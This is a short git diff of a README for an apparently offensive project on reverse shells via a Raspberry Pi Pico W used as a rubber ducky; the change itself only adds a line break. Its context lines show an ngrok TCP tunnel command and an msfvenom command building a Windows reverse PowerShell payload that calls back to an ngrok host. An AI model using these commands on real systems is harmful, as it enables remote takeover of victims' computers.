@@ -8,7 +8,7 @@ For port forwarding
 ```ngrok tcp 8080```<br><br>
 ![ngrok](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok.png)<br><br>
 ![ngrok1](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok1.png)<br><br>
-Windows reverse PowerShell payload
+Windows reverse PowerShell payload<br>
 ```msfvenom -p cmd/windows/reverse_powershell lhost=0.tcp.in.ngrok.io lport=10448 > ayush.bat ```<br><br>
 ![msf](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/msf.png)
 ## Rasberry pi pico w as rubber ducky
